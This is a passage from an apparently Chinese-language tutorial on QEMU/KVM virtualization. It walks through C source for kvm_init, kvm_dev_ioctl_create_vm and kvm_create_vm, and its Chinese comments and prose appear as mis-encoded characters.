class="hljs-number">0</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *kvm_type;<br><br>    s = KVM_STATE(ms-&gt;accelerator);<br><br>    <span class="hljs-comment">// ç¡®ä¿ç›®æ ‡é¡µå¤§å°ä¸å¤§äºä¸»æœºé¡µå¤§å°</span><br>    assert(TARGET_PAGE_SIZE &lt;= getpagesize());<br><br>    s-&gt;sigmask_len = <span class="hljs-number">8</span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_CAP_SET_GUEST_DEBUG</span><br>    QTAILQ_INIT(&amp;s-&gt;kvm_sw_breakpoints);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    QLIST_INIT(&amp;s-&gt;kvm_parked_vcpus);<br>    s-&gt;vmfd = <span class="hljs-number">-1</span>;<br>    s-&gt;fd = qemu_open(<span class="hljs-string">&quot;/dev/kvm&quot;</span>, O_RDWR);  <span class="hljs-comment">// æ‰“å¼€ KVM è®¾å¤‡æ–‡ä»¶</span><br>    <span class="hljs-keyword">if</span> (s-&gt;fd == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Could not access KVM kernel module: %m\n&quot;</span>);<br>        ret = -errno;<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// è·å– KVM API ç‰ˆæœ¬å¹¶è¿›è¡Œç‰ˆæœ¬æ£€æŸ¥</span><br>    ret = kvm_ioctl(s, KVM_GET_API_VERSION, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; KVM_API_VERSION) &#123;<br>        <span class="hljs-keyword">if</span> (ret &gt;= <span class="hljs-number">0</span>) &#123;<br>            ret = -EINVAL;<br>        &#125;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;kvm version too old\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ret &gt; KVM_API_VERSION) &#123;<br>        ret = -EINVAL;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;kvm version not supported\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ”¯æŒçš„å†…å­˜æ’æ§½æ•°é‡</span><br>    s-&gt;nr_slots = kvm_check_extension(s, KVM_CAP_NR_MEMSLOTS);<br><br>    <span class="hljs-comment">// å¦‚æœæœªæŒ‡å®šï¼Œåˆ™ä½¿ç”¨é»˜è®¤å€¼</span><br>    <span class="hljs-keyword">if</span> (!s-&gt;nr_slots) &#123;<br>        s-&gt;nr_slots = <span class="hljs-number">32</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// æ£€æŸ¥è™šæ‹Ÿ CPU é™åˆ¶</span><br>    soft_vcpus_limit = kvm_recommended_vcpus(s);<br>    hard_vcpus_limit = kvm_max_vcpus(s);<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ¯ç§ç±»å‹ CPU çš„æ•°é‡é™åˆ¶</span><br>    <span class="hljs-keyword">while</span> (nc-&gt;name) &#123;<br>        <span class="hljs-keyword">if</span> (nc-&gt;num &gt; soft_vcpus_limit) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                    <span class="hljs-string">&quot;Warning: Number of %s cpus requested (%d) exceeds &quot;</span><br>                    <span class="hljs-string">&quot;the recommended cpus supported by KVM (%d)\n&quot;</span>,<br>                    nc-&gt;name, nc-&gt;num, soft_vcpus_limit);<br><br>            <span class="hljs-keyword">if</span> (nc-&gt;num &gt; hard_vcpus_limit) &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Number of %s cpus requested (%d) exceeds &quot;</span><br>                        <span class="hljs-string">&quot;the maximum cpus supported by KVM (%d)\n&quot;</span>,<br>                        nc-&gt;name, nc-&gt;num, hard_vcpus_limit);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>        nc++;<br>    &#125;<br><br>    <span class="hljs-comment">// è·å– kvm-type é€‰é¡¹å¹¶æ ¹æ®æœºå™¨ç±»å‹ç¡®å®š type å€¼</span><br>    kvm_type = qemu_opt_get(qemu_get_machine_opts(), <span class="hljs-string">&quot;kvm-type&quot;</span>);<br>    <span class="hljs-keyword">if</span> (mc-&gt;kvm_type) &#123;<br>        type = mc-&gt;kvm_type(kvm_type);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (kvm_type) &#123;<br>        ret = -EINVAL;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Invalid argument kvm-type=%s\n&quot;</span>, kvm_type);<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// åˆ›å»º KVM è™šæ‹Ÿæœº</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        ret = kvm_ioctl(s, KVM_CREATE_VM, type);<br>    &#125; <span class="hljs-keyword">while</span> (ret == -EINTR);<br><br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ioctl(KVM_CREATE_VM) failed: %d %s\n&quot;</span>, -ret,<br>                strerror(-ret));<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> TARGET_S390X</span><br>        <span class="hljs-keyword">if</span> (ret == -EINVAL) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                    <span class="hljs-string">&quot;Host kernel setup problem detected. Please verify:\n&quot;</span>);<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;- for kernels supporting the switch_amode or&quot;</span><br>                    <span class="hljs-string">&quot; user_mode parameters, whether\n&quot;</span>);<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                    <span class="hljs-string">&quot;  user space is running in primary address space\n&quot;</span>);<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                    <span class="hljs-string">&quot;- for kernels supporting the vm.allocate_pgste sysctl, &quot;</span><br>                    <span class="hljs-string">&quot;whether it is enabled\n&quot;</span>);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// è®¾ç½® vmfd å¹¶æ£€æŸ¥æ”¯æŒçš„æ‰©å±•</span><br>    s-&gt;vmfd = ret;<br>    missing_cap = kvm_check_extension_list(s, kvm_required_capabilites);<br>    <span class="hljs-keyword">if</span> (!missing_cap) &#123;<br>        missing_cap =<br>            kvm_check_extension_list(s, kvm_arch_required_capabilities);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (missing_cap) &#123;<br>        ret = -EINVAL;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;kvm does not support %s\n%s&quot;</span>,<br>                missing_cap-&gt;name, upgrade_note);<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒååŒ MMIO</span><br>    s-&gt;coalesced_mmio = kvm_check_extension(s, KVM_CAP_COALESCED_MMIO);<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒåˆå¹¶å†…å­˜åŒºåŸŸ</span><br>    s-&gt;broken_set_mem_region = <span class="hljs-number">1</span>;<br>    ret = kvm_check_extension(s, KVM_CAP_JOIN_MEMORY_REGIONS_WORKS);<br>    <span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>        s-&gt;broken_set_mem_region = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒè™šæ‹Ÿ CPU äº‹ä»¶</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_CAP_VCPU_EVENTS</span><br>    s-&gt;vcpu_events = kvm_check_extension(s, KVM_CAP_VCPU_EVENTS);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒ X86 ROBUST SINGLESTEP</span><br>    s-&gt;robust_singlestep =<br>        kvm_check_extension(s, KVM_CAP_X86_ROBUST_SINGLESTEP);<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒè°ƒè¯•å¯„å­˜å™¨</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_CAP_DEBUGREGS</span><br>    s-&gt;debugregs = kvm_check_extension(s, KVM_CAP_DEBUGREGS);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒ IRQ è·¯ç”±</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_CAP_IRQ_ROUTING</span><br>    kvm_direct_msi_allowed = (kvm_check_extension(s, KVM_CAP_SIGNAL_MSI) &gt; <span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒ PCI 2.3</span><br>    s-&gt;intx_set_mask = kvm_check_extension(s, KVM_CAP_PCI_2_3);<br><br>    <span class="hljs-comment">// è®¾ç½® IRQ è®¾ç½®æ–¹å¼</span><br>    s-&gt;irq_set_ioctl = KVM_IRQ_LINE;<br>    <span class="hljs-keyword">if</span> (kvm_check_extension(s, KVM_CAP_IRQ_INJECT_STATUS)) &#123;<br>        s-&gt;irq_set_ioctl = KVM_IRQ_LINE_STATUS;<br>    &#125;<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒåªè¯»å†…å­˜</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_CAP_READONLY_MEM</span><br>    kvm_readonly_mem_allowed =<br>        (kvm_check_extension(s, KVM_CAP_READONLY_MEM) &gt; <span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒ IOEVENTFD</span><br>    kvm_eventfds_allowed =<br>        (kvm_check_extension(s, KVM_CAP_IOEVENTFD) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒ IRQFD</span><br>    kvm_irqfds_allowed =<br>        (kvm_check_extension(s, KVM_CAP_IRQFD) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒ IRQFD RESAMPLE</span><br>    kvm_resamplefds_allowed =<br>        (kvm_check_extension(s, KVM_CAP_IRQFD_RESAMPLE) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒ VM å±æ€§</span><br>    kvm_vm_attributes_allowed =<br>        (kvm_check_extension(s, KVM_CAP_VM_ATTRIBUTES) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒä»»æ„é•¿åº¦çš„ IOEVENTFD</span><br>    kvm_ioeventfd_any_length_allowed =<br>        (kvm_check_extension(s, KVM_CAP_IOEVENTFD_ANY_LENGTH) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–æ¶æ„ç›¸å…³å†…å®¹</span><br>    ret = kvm_arch_init(ms, s);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> err;<br>    &#125;<br><br>    <span class="hljs-comment">// å¦‚æœå…è®¸ä½¿ç”¨ IRQCHIPï¼Œåˆ™åˆ›å»º IRQCHIP</span><br>    <span class="hljs-keyword">if</span> (machine_kernel_irqchip_allowed(ms)) &#123;<br>        kvm_irqchip_create(ms, s);<br>    &#125;<br><br>    <span class="hljs-comment">// è®¾ç½® KVM çŠ¶æ€</span><br>    kvm_state = s;<br><br>    <span class="hljs-comment">// å¦‚æœæ”¯æŒ EVENTFDï¼Œåˆ™è®¾ç½® MEMORY ç›‘å¬å™¨çš„ eventfd æ“ä½œ</span><br>    <span class="hljs-keyword">if</span> (kvm_eventfds_allowed) &#123;<br>        s-&gt;memory_listener.listener.eventfd_add = kvm_mem_ioeventfd_add;<br>        s-&gt;memory_listener.listener.eventfd_del = kvm_mem_ioeventfd_del;<br>    &#125;<br>    s-&gt;memory_listener.listener.coalesced_mmio_add = kvm_coalesce_mmio_region;<br>    s-&gt;memory_listener.listener.coalesced_mmio_del = kvm_uncoalesce_mmio_region;<br><br>    <span class="hljs-comment">// æ³¨å†Œ MEMORY å’Œ IO ç›‘å¬å™¨</span><br>    kvm_memory_listener_register(s, &amp;s-&gt;memory_listener,<br>                                 &amp;address_space_memory, <span class="hljs-number">0</span>);<br>    memory_listener_register(&amp;kvm_io_listener,<br>                             &amp;address_space_io);<br><br>    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒå¤šä¸ª IOEVENTFD</span><br>    s-&gt;many_ioeventfds = kvm_check_many_ioeventfds();<br><br>    <span class="hljs-comment">// è®¾ç½® CPU ä¸­æ–­å¤„ç†å‡½æ•°</span><br>    cpu_interrupt_handler = kvm_handle_interrupt;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err:<br>    assert(ret &lt; <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (s-&gt;vmfd &gt;= <span class="hljs-number">0</span>) &#123;<br>        close(s-&gt;vmfd);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (s-&gt;fd != <span class="hljs-number">-1</span>) &#123;<br>        close(s-&gt;fd);<br>    &#125;<br>    g_free(s-&gt;memory_listener.slots);<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="4-3-2-KVMä¾§è™šæ‹Ÿæœºçš„åˆ›å»º"><a href="#4-3-2-KVMä¾§è™šæ‹Ÿæœºçš„åˆ›å»º" class="headerlink" title="4.3.2 KVMä¾§è™šæ‹Ÿæœºçš„åˆ›å»º"></a>4.3.2 KVMä¾§è™šæ‹Ÿæœºçš„åˆ›å»º</h3><p>kvm_initæœ€é‡è¦çš„ä½œç”¨æ˜¯è°ƒç”¨â€œ/dev/kvmâ€è®¾å¤‡çš„ioclt(KVM_CREATE_VM)æ¥å£åœ¨KVMæ¨¡å—ä¸­åˆ›å»ºä¸€å°è™šæ‹Ÿæœºã€‚æœ¬è´¨ä¸Šä¸€ä¸ªQEMUè¿›ç¨‹å°±æ˜¯ä¸€å°è™šæ‹Ÿæœºã€‚KVMä¸­ç”¨ç»“æ„ä½“kvmè¡¨ç¤ºè™šæ‹Ÿæœº</p><p>4.2èŠ‚ä¸­æåˆ°ï¼ŒKVMåœ¨åˆå§‹åŒ–çš„æ—¶å€™ä¼šæ³¨å†Œâ€œ/dev/kvmâ€è®¾å¤‡ï¼Œè¯¥è®¾å¤‡åœ¨å†…æ ¸å¯¹åº”çš„ioctlå‡½æ•°ä¸ºkvm_dev_ioctlï¼Œè¯¥å‡½æ•°å®ç°äº†æ‰€æœ‰KVMå±‚é¢çš„ioctlï¼Œå¯¹äºKVM_CREATE_VMï¼Œå…¶å¤„ç†å‡½æ•°æ˜¯kvm_dev_ioctl_create_vmï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">kvm_dev_ioctl_create_vm</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> type)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> r;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm</span> *<span class="hljs-title">kvm</span>;</span><br><br>    <span class="hljs-comment">// è°ƒç”¨ kvm_create_vm å‡½æ•°åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹ï¼Œå¹¶å°†å…¶ä¿å­˜åœ¨ kvm ç»“æ„ä¸­</span><br>    kvm = kvm_create_vm(type);<br>    <span class="hljs-keyword">if</span> (IS_ERR(kvm))<br>        <span class="hljs-keyword">return</span> PTR_ERR(kvm);<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_COALESCED_MMIO_PAGE_OFFSET</span><br>    <span class="hljs-comment">// å¦‚æœæ”¯æŒåˆå¹¶ MMIOï¼Œè°ƒç”¨ kvm_coalesced_mmio_init è¿›è¡Œåˆå§‹åŒ–</span><br>    r = kvm_coalesced_mmio_init(kvm);<br>    <span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>) &#123;<br>        kvm_put_kvm(kvm);<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªåŒ¿åçš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ï¼Œè¡¨ç¤ºè™šæ‹Ÿæœºå®ä¾‹</span><br>    <span class="hljs-comment">// å°† kvm_vm_fops ä½œä¸º file_operationsï¼Œç§æœ‰æ•°æ®è®¾ç½®ä¸ºåˆšåˆšåˆ›å»ºçš„ kvm ç»“æ„</span><br>    r = anon_inode_getfd(<span class="hljs-string">&quot;kvm-vm&quot;</span>, &amp;kvm_vm_fops, kvm, O_RDWR | O_CLOEXEC);<br>    <span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>)<br>        kvm_put_kvm(kvm);<br><br>    <span class="hljs-keyword">return</span> r;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å®ç°äº†åœ¨ KVM æ¨¡å—ä¸­åˆ›å»ºè™šæ‹Ÿæœºçš„æµç¨‹ã€‚å®ƒé¦–å…ˆè°ƒç”¨ <code>kvm_create_vm</code> å‡½æ•°åˆ›å»ºè™šæ‹Ÿæœºå®ä¾‹ï¼Œç„¶åæ ¹æ®æ”¯æŒåˆå¹¶ MMIO çš„æƒ…å†µè¿›è¡Œåˆå§‹åŒ–ï¼Œæœ€åé€šè¿‡ <code>anon_inode_getfd</code> åˆ›å»ºä¸€ä¸ªåŒ¿åæ–‡ä»¶æè¿°ç¬¦ï¼Œå°†è™šæ‹Ÿæœºå®ä¾‹ä¸æ–‡ä»¶æè¿°ç¬¦å…³è”ï¼Œä»¥ä¾¿åç»­é€šè¿‡è¯¥æ–‡ä»¶æè¿°ç¬¦è¿›è¡Œè™šæ‹Ÿæœºæ“ä½œ</p><p>kvm_create_vmæ˜¯åˆ›å»ºè™šæ‹Ÿæœºçš„æ ¸å¿ƒå‡½æ•°ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> struct kvm *<span class="hljs-title">kvm_create_vm</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> type)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> r, i;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm</span> *<span class="hljs-title">kvm</span> =</span> kvm_arch_alloc_vm();<br><br>    <span class="hljs-keyword">if</span> (!kvm)<br>        <span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–è™šæ‹Ÿæœºçš„é”ã€è®¡æ•°ç­‰æˆå‘˜</span><br>    spin_lock_init(&amp;kvm-&gt;mmu_lock);<br>    atomic_inc(&amp;current-&gt;mm-&gt;mm_count);<br>    kvm-&gt;mm = current-&gt;mm;<br>    kvm_eventfd_init(kvm);<br>    mutex_init(&amp;kvm-&gt;lock);<br>    mutex_init(&amp;kvm-&gt;irq_lock);<br>    mutex_init(&amp;kvm-&gt;slots_lock);<br>    atomic_set(&amp;kvm-&gt;users_count, <span class="hljs-number">1</span>);<br>    INIT_LIST_HEAD(&amp;kvm-&gt;devices);<br><br>    <span class="hljs-comment">// è°ƒç”¨æ¶æ„ç›¸å…³çš„åˆå§‹åŒ–å‡½æ•°</span><br>    r = kvm_arch_init_vm(kvm, type);<br>    <span class="hljs-keyword">if</span> (r)<br>        <span class="hljs-keyword">goto</span> out_err_no_disable;<br><br>    <span class="hljs-comment">// å¼€å¯ç¡¬ä»¶è™šæ‹ŸåŒ–</span><br>    r = hardware_enable_all();<br>    <span class="hljs-keyword">if</span> (r)<br>        <span class="hljs-keyword">goto</span> out_err_no_disable;<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–å…¶ä»–æ•°æ®ç»“æ„å’Œæˆå‘˜</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_HAVE_KVM_IRQFD</span><br>    INIT_HLIST_HEAD(&amp;kvm-&gt;irq_ack_notifier_list);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>    <span class="hljs-comment">// åˆ†é…å†…å­˜æ§½ç­‰æ•°æ®ç»“æ„</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; KVM_ADDRESS_SPACE_NUM; i++) &#123;<br>        kvm-&gt;memslots[i] = kvm_alloc_memslots();<br>        <span class="hljs-keyword">if</span> (!kvm-&gt;memslots[i])<br>            <span class="hljs-keyword">goto</span> out_err_no_srcu;<br>    &#125;<br><br>    <span class="hljs-comment">// åˆå§‹åŒ– srcu ç»“æ„</span><br>    <span class="hljs-keyword">if</span> (init_srcu_struct(&amp;kvm-&gt;srcu))<br>        <span class="hljs-keyword">goto</span> out_err_no_srcu;<br>    <span class="hljs-keyword">if</span> (init_srcu_struct(&amp;kvm-&gt;irq_srcu))<br>        <span class="hljs-keyword">goto</span> out_err_no_irq_srcu;<br><br>    <span class="hljs-comment">// åˆ†é…æ€»çº¿æ•°æ®ç»“æ„</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; KVM_NR_BUSES; i++) &#123;<br>        kvm-&gt;buses[i] = kzalloc(<span class="hljs-keyword">sizeof</span>(struct kvm_io_bus),<br>                                GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvm-&gt;buses[i])<br>            <span class="hljs-keyword">goto</span> out_err;<br>    &#125;<br><br>    <span class="hljs-comment">// åˆå§‹åŒ– MMU é€šçŸ¥æœºåˆ¶</span><br>    r = kvm_init_mmu_notifier(kvm);<br>    <span class="hljs-keyword">if</span> (r)<br>        <span class="hljs-keyword">goto</span> out_err;<br><br>    <span class="hljs-comment">// å°†è™šæ‹ŸæœºåŠ å…¥å…¨å±€è™šæ‹Ÿæœºé“¾è¡¨</span><br>    spin_lock(&amp;kvm_lock);<br>    list_add(&amp;kvm-&gt;vm_list, &amp;vm_list);<br>    spin_unlock(&amp;kvm_lock);<br><br>    preempt_notifier_inc();<br><br>    <span class="hljs-keyword">return</span> kvm;<br><br><span class="hljs-comment">// å‡ºé”™å¤„ç†</span><br>out_err:<br>    cleanup_srcu_struct(&amp;kvm-&gt;irq_srcu);<br>out_err_no_irq_srcu:<br>    cleanup_srcu_struct(&amp;kvm-&gt;srcu);<br>out_err_no_srcu:<br>    hardware_disable_all();<br>out_err_no_disable:<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; KVM_NR_BUSES; i++)<br>        kfree(kvm-&gt;buses[i]);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; KVM_ADDRESS_SPACE_NUM; i++)<br>        kvm_free_memslots(kvm, kvm-&gt;memslots[i]);<br>    kvm_arch_free_vm(kvm);<br>    mmdrop(current-&gt;mm);<br>    <span class="hljs-keyword">return</span> ERR_PTR(r);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸»è¦å®Œæˆäº†ä»¥ä¸‹æ“ä½œï¼š</p><ol><li>åˆ†é…å¹¶åˆå§‹åŒ– <code>kvm</code> ç»“æ„ä½“ï¼Œè¡¨ç¤ºä¸€ä¸ªè™šæ‹Ÿæœºã€‚</li><li>åˆå§‹åŒ–è™šæ‹Ÿæœºçš„å„ç§é”ã€è®¡æ•°ç­‰æˆå‘˜ã€‚</li><li>è°ƒç”¨æ¶æ„ç›¸å…³çš„åˆå§‹åŒ–å‡½æ•°ï¼Œå¦‚ <code>kvm_arch_init_vm</code>ã€‚</li><li>å¼€å¯ç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½ã€‚</li><li>åˆå§‹åŒ–å†…å­˜æ§½ç­‰æ•°æ®ç»“æ„ã€‚</li><li>åˆå§‹åŒ– MMU é€šçŸ¥æœºåˆ¶ã€‚</li><li>å°†è™šæ‹Ÿæœºæ·»åŠ åˆ°å…¨å±€è™šæ‹Ÿæœºé“¾è¡¨ä¸­ã€‚</li><li>è¿”å›åˆ›å»ºçš„è™šæ‹Ÿæœºå®ä¾‹ã€‚</li></ol><p>å°¤å…¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ul><li>kvm_create_vmæ¥ç€ä¼šåˆå§‹åŒ–KVMçš„ç›¸å…³æˆå‘˜ï¼Œå¦‚è¿™é‡Œçš„mmu_lockæˆå‘˜è¡¨ç¤ºæ“ä½œè™šæ‹ŸæœºMMUæ•°æ®çš„é”ï¼Œç”±äºè™šæ‹Ÿæœºçš„å†…å­˜å…¶å®ä¹Ÿå°±æ˜¯QEMUè¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å¼•ç”¨åˆ°å½“å‰QEMUè¿›ç¨‹çš„mm_structã€‚å¯¹åº”ä»£ç <code>atomic_inc(&amp;current-&gt;mm-&gt;mm_count);</code></li><li>KVMæœ‰ä¸ªç±»å‹ä¸ºkvm_archçš„archæˆå‘˜ï¼Œç”¨äºå­˜æ”¾ä¸æ¶æ„ç›¸å…³çš„æ•°æ®ï¼Œkvm_arch_init_vmç”¨æ¥åˆå§‹åŒ–è¿™äº›æ•°æ®ã€‚å¯¹åº”<code>r = kvm_arch_init_vm(kvm, 